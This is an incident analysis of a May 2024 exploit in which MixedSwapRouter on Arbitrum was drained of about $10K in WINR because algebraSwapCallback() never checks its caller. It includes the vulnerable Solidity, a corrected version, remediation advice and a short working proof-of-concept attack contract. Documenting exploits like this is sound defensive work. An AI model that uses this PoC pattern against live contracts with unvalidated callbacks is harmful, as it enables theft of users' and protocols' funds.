# MixedSwapRouter — algebraSwapCallback Caller Validation Missing Analysis

| Item | Details |
|------|------|
| **Date** | 2024-05 |
| **Protocol** | MixedSwapRouter |
| **Chain** | Arbitrum |
| **Loss** | ~$10,000 |
| **Vulnerable Contract** | MixedSwapRouter (Arbitrum) |
| **WINR Token** | Arbitrum WINR |
| **Root Cause** | The `algebraSwapCallback()` function does not validate `msg.sender`, allowing an attacker to call the callback directly and transfer tokens held by the router to an arbitrary address |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/MixedSwapRouter_exp.sol) |

---

## 1. Vulnerability Overview

The `algebraSwapCallback()` function in MixedSwapRouter is a callback that handles token settlement after an Algebra DEX swap completes. This callback should only be invoked by Algebra pool contracts, but due to the absence of `msg.sender` validation, anyone can call it directly. An attacker exploited this to transfer WINR tokens held by the router to their own address.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no caller validation on algebraSwapCallback
contract MixedSwapRouter {
    // Callback invoked by the Algebra pool after a swap
    function algebraSwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external {
        // No msg.sender validation — anyone can call directly
        (address tokenIn, address payer) = abi.decode(data, (address, address));
        if (amount0Delta > 0) {
            // Transfers tokenIn to msg.sender (address specified by attacker)
            IERC20(tokenIn).transfer(msg.sender, uint256(amount0Delta));
        }
    }
}

// ✅ Safe code: validates that caller is a legitimate Algebra pool
function algebraSwapCallback(
    int256 amount0Delta,
    int256 amount1Delta,
    bytes calldata data
) external {
    // Verify msg.sender is a pool registered in the factory
    require(
        IAlgebraFactory(factory).poolByPair(token0, token1) == msg.sender,
        "callback not from pool"
    );
    // ...
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] MixedSwapRouter.algebraSwapCallback(
  │         amount0Delta = routerWINRBalance,
  │         amount1Delta = 0,
  │         data = abi.encode(WINR, attacker)
  │       )
  │         └─ No msg.sender validation
  │         └─ WINR.transfer(attacker, routerBalance)
  │
  └─→ [2] ~$10K worth of WINR drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IMixedSwapRouter {
    function algebraSwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external;
}

contract AttackContract {
    IMixedSwapRouter constant router = IMixedSwapRouter(/* MixedSwapRouter */);
    address          constant WINR   = /* WINR token on Arbitrum */;

    function testExploit() external {
        uint256 routerBalance = IERC20(WINR).balanceOf(address(router));

        // Call algebraSwapCallback directly (no caller validation)
        router.algebraSwapCallback(
            int256(routerBalance),  // amount0Delta: full WINR balance held by router
            0,
            abi.encode(WINR, address(this))  // tokenIn, payer
        );
        // WINR.transfer(msg.sender(=attacker), routerBalance) executes
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing callback caller validation |
| **CWE** | CWE-346: Origin Validation Error |
| **Attack Vector** | External (direct call to algebraSwapCallback) |
| **DApp Category** | DEX Router (Algebra-based) |
| **Impact** | Router WINR balance drained (~$10K) |

## 6. Remediation Recommendations

1. **Callback caller validation**: Verify that `msg.sender` is a valid pool registered in the Algebra factory
2. **Nonce/data signing**: Include a signature/hash of the originating swap in the callback data
3. **Minimize router balance**: Clean up tokens immediately after each swap so the router holds no residual token balance
4. **Reference Miner_ETH pattern**: Apply the same caller validation pattern used in `uniswapV3SwapCallback`

## 7. Lessons Learned

- DEX callback functions (`uniswapV3SwapCallback`, `algebraSwapCallback`, `pancakeV3SwapCallback`) must always validate that `msg.sender` is a legitimate pool.
- The same missing callback caller validation pattern seen in Miner_ETH (2024-02) continues to recur across different DEX protocols.
- Designing router contracts to hold no token balance between swaps fundamentally eliminates this attack surface.